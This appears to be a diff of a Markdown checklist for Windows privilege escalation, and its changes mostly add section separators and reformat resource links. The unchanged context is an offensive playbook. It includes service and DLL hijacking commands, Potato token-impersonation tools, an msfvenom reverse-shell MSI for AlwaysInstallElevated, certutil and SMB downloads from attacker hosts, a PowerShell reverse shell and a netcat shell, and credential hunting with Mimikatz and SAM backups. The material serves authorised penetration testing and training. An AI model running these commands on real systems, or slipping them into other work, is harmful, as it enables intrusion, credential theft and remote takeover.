@@ -6,9 +6,9 @@
 
 ---
 
-Windows privilege-escalation checklist. Start with WinPEAS, then the items below.
-
 **Best tool:** [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+
+---
 
 ## System Info
 
@@ -21,6 +21,8 @@ Windows privilege-escalation checklist. Start with WinPEAS, then the items below
 - [ ] `wmic logicaldisk get caption,description,providername` - Mounted drives
 - [ ] Check WSUS configuration for hijacking
 - [ ] `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` (both HKCU and HKLM = 0x1)
+
+---
 
 ## User & Privileges
 
@@ -35,6 +37,8 @@ Windows privilege-escalation checklist. Start with WinPEAS, then the items below
 - [ ] `net accounts` - Password policy
 - [ ] `query user` / `qwinsta` - Logged in users
 
+---
+
 ## Services
 
 - [ ] `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"` - Unquoted service paths
@@ -45,12 +49,16 @@ Windows privilege-escalation checklist. Start with WinPEAS, then the items below
 - [ ] Can you modify service config? `sc config <service> binPath= "cmd.exe"`
 - [ ] Check services registry: `reg query HKLM\SYSTEM\CurrentControlSet\Services`
 
+---
+
 ## Scheduled Tasks
 
 - [ ] `schtasks /query /fo LIST /v` - All scheduled tasks
 - [ ] Check task binary permissions: `icacls C:\path\to\task.exe`
 - [ ] Look for tasks running as SYSTEM with writable binaries
 - [ ] Check task XML files: `icacls C:\Windows\System32\Tasks\*`
+
+---
 
 ## Applications & Startup
 
@@ -60,12 +68,16 @@ Windows privilege-escalation checklist. Start with WinPEAS, then the items below
 - [ ] `icacls "C:\Program Files"` - Can you write to Program Files?
 - [ ] `icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"` - Startup folder writable?
 
+---
+
 ## DLL Hijacking
 
 - [ ] `echo %PATH%` - Check writable directories in PATH
 - [ ] Use Process Monitor to find missing DLLs
 - [ ] Check if service binary loads DLLs from writable locations
 - [ ] `icacls C:\path\to\service\folder` - Can you write DLLs?
+
+---
 
 ## Processes
 
@@ -75,6 +87,8 @@ Windows privilege-escalation checklist. Start with WinPEAS, then the items below
 - [ ] Look for processes running as SYSTEM with weak permissions
 - [ ] Check for credentials in memory (ProcDump, Mimikatz)
 
+---
+
 ## Network
 
 - [ ] `ipconfig /all` - Network configuration
@@ -83,6 +97,8 @@ Windows privilege-escalation checklist. Start with WinPEAS, then the items below
 - [ ] `arp -a` - ARP cache
 - [ ] `netsh firewall show state` - Firewall status
 - [ ] Look for services listening on 127.0.0.1 only
+
+---
 
 ## Credentials & Passwords
 
@@ -132,6 +148,8 @@ Windows privilege-escalation checklist. Start with WinPEAS, then the items below
 - [ ] `dir /s /b C:\Users\*.ppk 2>nul` - SSH keys
 - [ ] SAM/SYSTEM backups: `%SYSTEMROOT%\repair\SAM`, `%SYSTEMROOT%\System32\config\RegBack\SAM`
 
+---
+
 ## Token Impersonation Exploits
 
 **If SeImpersonatePrivilege or SeAssignPrimaryPrivilege enabled:**
@@ -141,6 +159,8 @@ Windows privilege-escalation checklist. Start with WinPEAS, then the items below
 - [ ] **RoguePotato** (Windows 10/2019): `RoguePotato.exe -r <AttackerIP> -e "cmd.exe" -l 9999`
 - [ ] **GodPotato** (Windows 2012-2022): `GodPotato.exe -cmd "cmd /c whoami"`
 
+---
+
 ## AlwaysInstallElevated
 
 - [ ] Check both registry keys for `0x1`:
@@ -148,6 +168,8 @@ Windows privilege-escalation checklist. Start with WinPEAS, then the items below
   - `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
 - [ ] Create MSI: `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi > exploit.msi`
 - [ ] Install: `msiexec /quiet /qn /i exploit.msi`
+
+---
 
 ## Quick Wins
 
@@ -187,6 +209,8 @@ copy malicious.exe "C:\Program Files\Service\service.exe"
 sc stop <service> && sc start <service>
 ```
 
+---
+
 ## File Transfer
 
 ```powershell
@@ -201,6 +225,8 @@ certutil -urlcache -f http://<IP>/file.exe file.exe
 copy \\<ATTACKER_IP>\share\file.exe .
 ```
 
+---
+
 ## Reverse Shells
 
 ```powershell
@@ -211,6 +237,8 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',4444);$s
 nc.exe -e cmd.exe <IP> 4444
 ```
 
+---
+
 ## Automated Tools
 
 - **WinPEAS**: `.\winPEASx64.exe`
@@ -219,8 +247,11 @@ nc.exe -e cmd.exe <IP> 4444
 - **Seatbelt**: `.\Seatbelt.exe -group=all`
 - **Windows Exploit Suggester**: `python windows-exploit-suggester.py --database <date>.xls --systeminfo systeminfo.txt`
 
+---
+
 ## Resources
 
-- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) — automated Windows privesc checks
-- [PayloadsAllTheThings — Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) — methodology and commands
-- [HackTricks — Windows local privilege escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) — per-vector notes
+- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+- **HackTricks**: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
+- **LOLBAS**: https://lolbas-project.github.io/
+- **GTFOBins (Windows)**: https://wadcoms.github.io/
